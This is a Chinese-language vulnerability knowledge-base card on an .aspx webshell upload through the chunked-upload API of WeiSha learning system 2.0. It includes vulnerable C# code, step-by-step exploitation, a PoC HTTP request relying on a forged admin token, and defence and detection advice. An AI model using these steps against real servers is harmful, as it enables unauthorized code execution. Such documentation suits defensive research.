---
id: web-generic-file-upload-dotnet-chunked-pathkey-filename-aspx-webshell
title: .NET 分片上传 Chunked 接口 pathkey/filename 可控：无扩展名校验合并写入 aspx webshell
type: scenario
domain: web
path: web/generic/file-upload
technique: dotnet-chunked-upload-filename-aspx-webshell
tags:
- web
- dotnet
- file-upload
- chunked-upload
- webshell
- aspx
- rce
- iis
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: 微厦在线学习考试系统 2.0
verification:
  verified_by: verifier-V262
  verified_at: '2026-11-07T17:50:01+08:00'
  notes: V262 重核：对照正文与24图，Upload.cs Chunked 的 [Admin,Teacher]、tempHv、分片 index.uid、complete==total 后 Path.Combine(tempHv,filename) 合并；请求 pathkey=Temp&filename=test.aspx&total=1&index=1&uid=b917...、响应 /Upload/Temp/test_5.aspx、C2 连接 test_7.aspx 后 whoami=apppool\... 均一致；dup-scan pair18 与 UEditor Content-Type 上传为不同产品/机制，保留两卡。affected_versions 微厦 2.0。
url: /docs/web/generic/file-upload/web-generic-file-upload-dotnet-chunked-pathkey-filename-aspx-webshell/
draft: false
kb_aliases:
- 微厦 Upload/Chunked
- 分片上传合并 aspx
- filename 可控上传
- X-Custom-Header WeishaKeji
- 大文件分块 getshell
---

## 一句话结论

微厦学习系统的 `POST /api/v2/Upload/Chunked` 把查询参数 `filename` 直接作为分片合并后的落盘文件名，`pathkey=Temp` 对应 Web 可访问的临时目录，控制器虽有 `[Admin, Teacher]` 但可用伪造的管理员 Authorization 通过；上传一个 `filename=test.aspx`、内容为 ASPX 动态载荷的单分片请求，即可在 Web 目录写入 `.aspx` webshell 并 getshell。

## 原理

- 源码 `Song.ViewData/Methods/Upload.cs` 的 `Chunked` 方法签名为：

```csharp
[HttpPost]
[Upload(CannotEmpty = true, MaxSize = int.MaxValue)]
[Admin, Teacher]
public JObject Chunked(string pathkey, string filename, int total, int index, string uid)
{
    string tempHv = WeiSha.Core.Upload.Get["Temp"].Physics;
    foreach (string key in this.Letter.Files) {
        HttpPostedFileBase file = this.Letter.Files[key];
        string chunkname = Path.Combine(tempHv, index + "." + uid);
        file.SaveAs(chunkname);
        break;
    }
    ...
    if (complete == total) {
        string final = Path.Combine(tempHv, filename);
        // 合并分片到 final
    }
}
```

  分片先保存为 `{index}.{uid}`；当同名 `uid` 的分片数量达到 `total` 时，用 `Path.Combine(tempHv, filename)` 作为最终文件名合并。
- 两个关键点：
  1. `filename` 来自查询参数，完全由调用方控制，代码未做扩展名白名单/内容校验；`pathkey=Temp` 映射到 `WeiSha.Core.Upload["Temp"]` 的物理目录，而该目录在站点下可通过 `/Upload/Temp/...` 访问。
  2. 控制器只要求 `[Admin, Teacher]`，而该系统的管理员令牌可用静态 DES 密钥伪造（见关联卡），因此未持有真实口令也能满足授权。
- IIS 会对 `.aspx` 请求交给 ASP.NET 解析，上传的 ASPX 动态载荷（原文使用 `CSharpDynamicPayload` C2 客户端）被执行，进程权限即 IIS 应用池账号；原文 `whoami` 显示 `apppool\...`。
- `[Upload(CannotEmpty=true, MaxSize=int.MaxValue)]` 只限制非空与大小，不限制扩展名；其他上传接口有过滤，唯独该分片接口缺失校验。

## 触发条件

- 目标为微厦在线学习考试系统，`/api/v2/Upload/Chunked` 暴露且 `pathkey=Temp` 指向 Web 可写、可访问目录。
- 攻击者持有 `[Admin, Teacher]` 认可的令牌：真实管理员会话，或用泄露的 CheckUID + 默认 DES 密钥伪造的 Authorization。
- 目标 IIS 允许上传目录中的 `.aspx` 执行（默认允许，除非额外配置 requestFiltering/禁用脚本）。
- 分片请求需带 `X-Custom-Header: WeishaKeji`、`Encrypt: false`，并正确提供 `uid`、`total`、`index`。

## 利用步骤

1. 获取管理员 Authorization（真实会话或伪造，见关联卡），确认后台接口可调用。
2. 构造单分片上传：`total=1&index=1`，`uid` 用随机 GUID，`filename=test.aspx`，`pathkey=Temp`；multipart 的 file 部分放 ASPX 载荷内容。
3. 发送请求，服务端将分片保存为 `1.<uid>`，因 `complete==total` 立即合并为 `<Temp>/test.aspx`（原文响应实际路径为 `/Upload/Temp/test_5.aspx`，重名时服务端会加后缀）。
4. 访问 `http://target/Upload/Temp/test.aspx`（或响应返回的路径），确认 ASPX 载荷执行（原文用 C2 客户端连接，执行 `ipconfig`/`whoami`）。
5. 通过 webshell/C2 在 IIS 应用池权限下执行命令、横向或继续提权。

## PoC

原文最小请求：

```http
POST /api/v2/Upload/Chunked?pathkey=Temp&filename=test.aspx&total=1&index=1&uid=b917805a-0d96-452b-8621-c11c5b207b05 HTTP/1.1
Host: target.example
User-Agent: python-requests/2.31.0
Authorization: Basic <管理员或伪造令牌>
X-Custom-Header: WeishaKeji
Encrypt: false
Content-Type: multipart/form-data; boundary=3723a6409b6bb95d291054e27c366fd4
Content-Length: 3410

--3723a6409b6bb95d291054e27c366fd4
Content-Disposition: form-data; name="file"; filename="1.b917805a-0d96-452b-8621-c11c5b207b05"

<ASPX 动态载荷内容>
--3723a6409b6bb95d291054e27c366fd4--
```

响应示例（节选）：`{"success":true,"result":{"pathkey":"Temp","name":"test.aspx","total":1,"index":1,"uid":"b917...","completed":1,"success":true,"filename":"test_5.aspx","path":"/Upload/Temp/test_5.aspx"}}`。原文随后用 C2 客户端连接该地址并成功执行 `whoami`。

## 变体与关联

- 分片数量大于 1 时，需按 `index` 上传全部分片并保持同一 `uid`，服务端统计 `Directory.GetFiles(tempHv, "*."+uid).Length == total` 后才合并；可借此绕过单请求大小限制。
- 同类分片合并上传 RCE：`web-generic-file-upload-yifangcms-webuploader-chunk-merge-rce`（PHP/YiFangCMS，参数为 uploadPath/md5value/name）；本卡是 .NET/IIS，参数与落盘逻辑不同。
- 其他 .NET 上传卡：`web-generic-file-upload-dotnet-uploadpicture-aspx-webshell`、`web-generic-file-upload-dotnet-blacklist-only-asp-aspx`；本卡的特点是“分片合并 + filename 直接落盘 + 需要 Admin/Teacher 令牌”。
- 关联前置：`web-generic-auth-dotnet-des-checkcode-authorization-forgery`（伪造管理员令牌）、`web-generic-auth-unauth-position-employee-api-checkuid-leak`（获取 CheckUID）。

## 检测与防御

- 上传接口对文件名做白名单（仅允许业务需要的图片/文档扩展名）、随机化文件名、剥离路径；禁止把用户可控的 `filename` 直接用于 `Path.Combine`。
- 上传目录移出 Web 根，或在 IIS 中对上传目录禁用脚本执行（requestFiltering 拒绝 `.aspx/.ashx/.asmx/.config` 等），并设置 `Content-Disposition: attachment`。
- 校验文件内容与 MIME，使用病毒/WebShell 扫描；分片合并前验证所有分片的类型与大小。
- 修复认证链：不要使用默认 DES 密钥与可泄露的 CheckUID，所有上传接口强制真实授权并记录审计。
- 监控：`/api/v2/Upload/Chunked` 出现 `.aspx/.ashx/.asmx` 文件名、同一 uid 大量分片、上传后立即访问 `/Upload/Temp/*.aspx` 的行为。
